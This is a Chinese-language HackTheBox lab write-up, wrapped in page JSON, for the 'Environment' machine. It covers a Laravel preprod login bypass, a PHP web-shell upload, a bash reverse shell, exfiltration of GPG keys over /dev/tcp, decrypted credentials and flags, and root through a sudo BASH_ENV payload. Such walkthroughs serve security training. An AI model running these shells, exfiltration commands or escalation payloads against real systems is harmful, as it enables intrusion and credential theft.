{"pageProps":{"postData":{"id":"HackTheBoxMachine - Environment","contentHtml":"<h1>Machine - Environment</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Environment\">https://app.hackthebox.com/machines/Environment</a> | <code>Linux</code> | <code>Medium</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Environment nmap -sT -min-rate 10000 -p- 10.10.11.67\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 01:13 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> environment.htb (10.10.11.67)\nHost is up (0.30s latency).\nNot shown: 65522 filtered tcp ports (no-response)\nPORT     STATE  SERVICE\n21/tcp   closed ftp\n22/tcp   open   ssh\n80/tcp   open   http\n110/tcp  closed pop3\n113/tcp  closed ident\n135/tcp  closed msrpc\n143/tcp  closed imap\n443/tcp  closed https\n445/tcp  closed microsoft-ds\n995/tcp  closed pop3s\n1720/tcp closed h323q931\n5900/tcp closed vnc\n8080/tcp closed http-proxy\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 44.10 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Environment nmap -sT -A -T4 -O -p 22,80 10.10.11.67\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-06 01:10 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> environment.htb (10.10.11.67)\nHost is up (0.43s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n| ssh-hostkey: \n|   256 5c:02:33:95:ef:44:e2:80:<span class=\"hljs-built_in\">cd</span>:3a:96:02:23:f1:92:64 (ECDSA)\n|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)\n80/tcp open  http    nginx 1.22.1\n|_http-server-header: nginx/1.22.1\n|_http-title: Save the Environment | environment.htb\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   484.29 ms 10.10.16.1\n2   303.43 ms environment.htb (10.10.11.67)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 32.49 seconds\n</code></pre>\n<h2>Web 渗透</h2>\n<h3>信息收集</h3>\n<p>访问 <code>HTTP</code> 服务</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image.png\" alt=\"image.png\"></p>\n<p>可能是开发环境？</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image1.png\" alt=\"image.png\"></p>\n<p>扫描一下目录</p>\n<pre><code class=\"hljs language-bash\">➜  Environment dirsearch -u http://environment.htb -x 403,404,429 -e php,zip,txt                  \n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Environment/reports/http_environment.htb/_25-05-06_01-40-51.txt\n\nTarget: http://environment.htb/\n\n[01:40:51] Starting: \n[01:42:23] 301 -  169B  - /build  ->  http://environment.htb/build/\n[01:42:44] 200 -    0B  - /favicon.ico\n[01:42:58] 200 -    2KB - /index.php/login/\n[01:43:07] 200 -    2KB - /login\n[01:43:07] 200 -    2KB - /login/\n[01:43:08] 302 -  358B  - /logout  ->  http://environment.htb/login\n[01:43:08] 302 -  358B  - /logout/  ->  http://environment.htb/login\n[01:43:35] 200 -   24B  - /robots.txt\n[01:43:45] 301 -  169B  - /storage  ->  http://environment.htb/storage/\n[01:43:56] 405 -  245KB - /upload\n[01:43:56] 405 -  245KB - /upload/\n\nTask Completed\n</code></pre>\n<p><code>/upload</code> ，直接访问能得到 <code>PHP 8.2.28</code> <code>Laravel 11.30.0</code> 并且开启了<code>APP_DEBUG=true</code>（因为看的到调试页面），错误中显示了一部分代码</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image2.png\" alt=\"image.png\"></p>\n<h3>APP_DEBUG 利用</h3>\n<p>我们到登陆页面尝试让其弹出 <code>stracktrace</code> 页面，查看一下上下代码</p>\n<p>修改成一个不存在的方法即可</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image4.png\" alt=\"image.png\"></p>\n<p>但是也没有发现什么</p>\n<p>然后测试时将 <code>remember</code> 的参数去掉，就能得到 <code>500</code> 错误</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image5.png\" alt=\"image.png\"></p>\n<p>并且泄露了登录逻辑，看代码是开发者给自己留了捷径</p>\n<pre><code class=\"hljs language-bash\">  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$keep_loggedin</span> !== False) {\n    // TODO: Keep user logged <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">if</span> he selects <span class=\"hljs-string\">\"Remember Me?\"</span>\n    }\n \n    <span class=\"hljs-keyword\">if</span>(App::environment() == <span class=\"hljs-string\">\"preprod\"</span>) { //QOL: login directly as me <span class=\"hljs-keyword\">in</span> dev/local/preprod envs\n        <span class=\"hljs-variable\">$request</span>->session()->regenerate();\n        <span class=\"hljs-variable\">$request</span>->session()->put(<span class=\"hljs-string\">'user_id'</span>, 1);\n        <span class=\"hljs-built_in\">return</span> redirect(<span class=\"hljs-string\">'/management/dashboard'</span>);\n    }\n</code></pre>\n<p>构造链接，根据佬们提示，可以使用的 <strong><code>--env=preprod</code></strong> 进入分支，发送数据包后重定向到 <strong><code>/management/dashboard</code></strong></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image6.png\" alt=\"image.png\"></p>\n<p>然后就成功进入后台了</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image7.png\" alt=\"image.png\"></p>\n<h3>文件上传</h3>\n<p><code>Profile</code> 页面还有上传功能点</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image8.png\" alt=\"image.png\"></p>\n<p>测试发现能上传 <code>.user.ini</code> ，但是有个坑，多次上传会提示：</p>\n<pre><code class=\"hljs language-bash\">{<span class=\"hljs-string\">\"error\"</span>:{<span class=\"hljs-string\">\"message\"</span>:<span class=\"hljs-string\">\"A file with this name already exists!\"</span>}}\n</code></pre>\n<p>最后测试可以上传 <code>x.php.</code> 的文件</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image9.png\" alt=\"image.png\"></p>\n<p>访问上传的路径，成功解析</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image10.png\" alt=\"image.png\"></p>\n<p>上传一句话木马</p>\n<pre><code class=\"hljs language-bash\">-----------------------------36025816183919919027932701280\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"upload\"</span>; filename=<span class=\"hljs-string\">\"6.php.\"</span>\nContent-Type:image/png\n\nGIF89a\n&#x3C;?php @<span class=\"hljs-built_in\">eval</span>(system(<span class=\"hljs-variable\">$_POST</span>[1]));?>\n</code></pre>\n<p>进行反弹 <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">1=%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F&#x3C;YOUR_IP>%2F&#x3C;YOUR_PORT>+0%3E%261%27\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image11.png\" alt=\"image.png\"></p>\n<h2>提权 - To Hish</h2>\n<p><code>hish</code> 用户家目录能找到 user.txt</p>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish$ <span class=\"hljs-built_in\">cat</span> user.txt\n<span class=\"hljs-built_in\">cat</span> user.txt\nb3fc4246b5457791238ca88f08f93f9d\n</code></pre>\n<h3>解密 PGP</h3>\n<p><code>backup</code> 目录找到 <code>gpg</code> ，应该是要用 <code>gpg key</code> 进行登录</p>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish/backup$ <span class=\"hljs-built_in\">ls</span>\n<span class=\"hljs-built_in\">ls</span>\nkeyvault.gpg\n</code></pre>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish/.gnupg$ <span class=\"hljs-built_in\">ls</span>\nopenpgp-revocs.d   pubring.kbx   random_seed\nprivate-keys-v1.d  pubring.kbx~  trustdb.gpg\n</code></pre>\n<p>查看文件类型</p>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish/.gnupg$ file ../backup/keyvault.gpg \n../backup/keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA (Encrypt or Sign) 2048b .\n</code></pre>\n<p>尝试解密，发现权限不足</p>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish$ gpg --homedir /home/hish/.gnupg --decrypt /home/hish/backup/keyvault.gpg \ngpg: WARNING: unsafe ownership on homedir <span class=\"hljs-string\">'/home/hish/.gnupg'</span>\ngpg: failed to create temporary file <span class=\"hljs-string\">'/home/hish/.gnupg/.#lk0x000055f4a7783a60.environment.18159'</span>: Permission denied\ngpg: can<span class=\"hljs-string\">'t connect to the agent: Permission denied\ngpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11\n      \"hish_ &#x3C;hish@environment.htb>\"\ngpg: decryption failed: No secret key\n</span></code></pre>\n<p>将 <code>.gnupg</code> 和 <code>keyvault.gpg</code> 都拉到 <code>Kali</code></p>\n<pre><code class=\"hljs language-bash\">www-data@environment:/home/hish$ <span class=\"hljs-built_in\">cat</span> backup/keyvault.gpg > /dev/tcp/10.10.16.27/1235\n\nwww-data@environment:/home/hish$ tar -cvf /tmp/.gnupg.tar .gnupg/\n.gnupg/\n.gnupg/private-keys-v1.d/\n.gnupg/private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key\n.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key\n.gnupg/trustdb.gpg\n.gnupg/pubring.kbx\n.gnupg/openpgp-revocs.d/\n.gnupg/openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev\n.gnupg/pubring.kbx~\n.gnupg/random_seed\n\nwww-data@environment:/home/hish$ <span class=\"hljs-built_in\">cat</span> /tmp/.gnupg.tar > /dev/tcp/10.10.16.27/1235\n</code></pre>\n<p>再次解密，得到密码：<code>marineSPm@ster!!</code></p>\n<pre><code class=\"hljs language-bash\">➜  Environment gpg --homedir .gnupg --decrypt keyvault.gpg \ngpg: 警告：家目录‘/root/Desktop/test/Environment/.gnupg’的所有权不安全\ngpg: 由 2048 位的 RSA 密钥加密，标识为 B755B0EDD6CFCFD3，生成于 2025-01-11\n      “hish_ &#x3C;hish@environment.htb>”\nPAYPAL.COM -> Ihaves0meMon<span class=\"hljs-variable\">$yhere123</span>\nENVIRONMENT.HTB -> marineSPm@ster!!\nFACEBOOK.COM -> summerSunnyB3ACH!!\n</code></pre>\n<p>成功登录</p>\n<pre><code class=\"hljs language-bash\">➜  Environment ssh hish@environment.htb      \nThe authenticity of host <span class=\"hljs-string\">'environment.htb (10.10.11.67)'</span> can<span class=\"hljs-string\">'t be established.\nED25519 key fingerprint is SHA256:GKtBN7PjK58Q8eTT80jQMUZYS5ZLu8ccptkyIueks18.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '</span>environment.htb<span class=\"hljs-string\">' (ED25519) to the list of known hosts.\nhish@environment.htb'</span>s password: \nLinux environment 6.1.0-34-amd64 <span class=\"hljs-comment\">#1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64</span>\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms <span class=\"hljs-keyword\">for</span> each program are described <span class=\"hljs-keyword\">in</span> the\nindividual files <span class=\"hljs-keyword\">in</span> /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May 6 21:51:47 2025 from 10.10.16.27\nhish@environment:~$ \n</code></pre>\n<h2>提权 - To Root</h2>\n<h3>信息收集</h3>\n<p><code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">hish@environment:~$ <span class=\"hljs-built_in\">sudo</span> -l\n[<span class=\"hljs-built_in\">sudo</span>] password <span class=\"hljs-keyword\">for</span> hish: \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> hish on environment:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=<span class=\"hljs-string\">\"ENV BASH_ENV\"</span>, use_pty\n\nUser hish may run the following commands on environment:\n    (ALL) /usr/bin/systeminfo\n</code></pre>\n<h3>路径劫持</h3>\n<p>执行后会运行一些命令，例如 <code>netstat</code> 等</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image12.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">hish@environment:~$ <span class=\"hljs-built_in\">cat</span> /usr/bin/systeminfo \n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Displaying kernel ring buffer logs (dmesg) ###\"</span>\ndmesg | <span class=\"hljs-built_in\">tail</span> -n 10\n\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Checking system-wide open ports ###\"</span>\nss -antlp\n\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Displaying information about all mounted filesystems ###\"</span>\nmount | column -t\n\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Checking system resource limits ###\"</span>\n<span class=\"hljs-built_in\">ulimit</span> -a\n\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Displaying loaded kernel modules ###\"</span>\nlsmod | <span class=\"hljs-built_in\">head</span> -n 10\n\n<span class=\"hljs-built_in\">echo</span> -e <span class=\"hljs-string\">\"\\n### Checking disk usage for all filesystems ###\"</span>\n<span class=\"hljs-built_in\">df</span> -h\n</code></pre>\n<p>然后尝试了一下简单的路径劫持</p>\n<pre><code class=\"hljs language-bash\">hish@environment:~$ <span class=\"hljs-built_in\">export</span> PATH=/home/hish:<span class=\"hljs-variable\">$PATH</span>\n</code></pre>\n<p>发现不能成功，因为名字相同的 <code>shell‑builtin</code> 总是先被调用</p>\n<p>但是可以注意到</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image13.png\" alt=\"image.png\"></p>\n<p><code>sudo</code> 默认会清掉大部分环境变量，只有在这里明确 <code>env_keep</code> 才会保留；</p>\n<p>然后 <code>ENV BASH_ENV</code> 是变量，我们可以控制，<code>Payload</code>是：</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'/bin/bash -p'</span> > /tmp/root.sh ; <span class=\"hljs-built_in\">chmod</span> +x /tmp/root.sh ; <span class=\"hljs-built_in\">env</span> -i BASH_ENV=/tmp/root.sh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin <span class=\"hljs-built_in\">sudo</span> /usr/bin/systeminfo\n</code></pre>\n<p>这里做了什么？</p>\n<p>首先创建 <code>root.sh</code> 执行后会创建一个新的 <code>shell</code> 。<code>env -i</code>从一个<strong>空环境</strong>开始（清除掉所有原有环境变量），保证后面只存在我们显式指定的变量。<code>BASH_ENV=/tmp/root.sh</code> 这是非交互式 Bash 启动时会自动读取并执行的环境变量。我们把它指向刚刚写好的 <code>/tmp/root.sh</code> 。<code>PATH=…</code>\n设置一个最小可用的 PATH，保证后续 <code>sudo</code>、<code>bash</code>、<code>echo</code> 等都能找到。</p>\n<p><code>sudo /usr/bin/systeminfo</code> 以 root 身份执行 <code>systeminfo</code> 脚本。因为 <code>systeminfo</code> 文件头是 <code>#!/bin/bash</code>，所以它会被非交互式的 Bash 解释执行。</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Environment/image14.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">root@environment:~# <span class=\"hljs-built_in\">cat</span> root.txt \n74c70b0fe4bcb9d5a6aff48c71046584\n</code></pre>","title":"HackTheBox - Machine - Environment","date":"2025-05-06","updated":"2025-05-06","comments":true,"tags":["Linux靶机","HackTheBox","ENV","Laravel","路径劫持","encrypt"],"categories":"靶机","description":"Machine - Environment\n\n https://app.hackthebox.com/machines/Environment | `Linux` | `Medium`\n \n\n前期踩点\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n访问 `HTTP` 服务\n\n\n\n可能是开发环境？\n\n\n\n扫描一下目录\n\n\n\n`/upload` ，直接访问能得到 `PHP 8.2.28` `Laravel 1...","isEncrypted":true}},"__N_SSG":true}